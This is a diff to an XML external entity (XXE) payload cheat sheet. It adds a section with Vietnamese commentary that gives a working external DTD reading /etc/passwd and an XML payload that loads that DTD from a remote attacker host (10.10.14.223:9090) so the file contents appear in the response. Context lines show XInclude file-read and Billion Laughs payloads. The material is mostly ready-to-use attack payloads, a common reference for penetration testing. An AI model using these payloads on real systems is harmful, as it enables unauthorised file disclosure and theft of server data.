@@ -12,6 +12,7 @@
     - [Classic XXE Base64 Encoded](#classic-xxe-base64-encoded)
     - [PHP Wrapper Inside XXE](#php-wrapper-inside-xxe)
     - [XInclude Attacks](#xinclude-attacks)
+    - [Basic via dtd](#basic-via-dtd)
 - [Exploiting XXE to Perform SSRF Attacks](#exploiting-xxe-to-perform-SSRF-attacks)
 - [Exploiting XXE to Perform a Denial of Service](#exploiting-xxe-to-perform-a-denial-of-service)
     - [Billion Laugh Attack](#billion-laugh-attack)
@@ -149,6 +150,28 @@ When you can't modify the **DOCTYPE** element use the **XInclude** to target
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
+### Basic via dtd
+Mục tiêu là khai báo một entity ở file dtd lưu trên server:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents 
+'%start;%file;%end;'>">
+```
+Payload submit sẽ sử dụng entity mình khai báo rồi hiển thị ra màn hình
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE a [
+  <!ENTITY % dtd SYSTEM
+  "http://10.10.14.223:9090/xxe.dtd">
+  %dtd;
+  %all;
+]>
+<root>
+<email>&fileContents;</email>
+</root>
+```
 
 
 ## Exploiting XXE to Perform SSRF Attacks
@@ -210,6 +233,9 @@ A variant of the Billion Laughs attack, using delayed interpretation of paramete
 ]>
 <r/>
 ```
+
+
+
 
 
 ## Exploiting Error Based XXE
